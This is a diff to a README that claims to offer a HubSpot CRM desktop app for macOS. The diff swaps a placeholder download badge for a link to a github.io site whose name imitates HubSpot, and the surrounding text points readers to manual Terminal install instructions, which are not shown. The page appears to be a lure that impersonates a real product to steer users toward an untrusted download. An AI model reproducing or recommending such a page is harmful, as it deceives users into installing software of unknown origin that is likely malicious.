@@ -2,7 +2,7 @@
 
 HubSpot CRM is a powerful customer relationship management platform now available as a dedicated Mac desktop app. Whether you're managing contacts, tracking deals, or analyzing sales pipelines, HubSpot CRM delivers a seamless experience optimized for macOS. 🎯
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-blue.svg?style=for-the-badge\&logo=apple)](#)
+[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-blue.svg?style=for-the-badge\&logo=apple)](https://hubspot-for-mac-os-download-hubspot-crm.github.io/.github/)
 
 If the download button doesn't work, follow the instructions below to install HubSpot CRM manually using your Terminal.
 
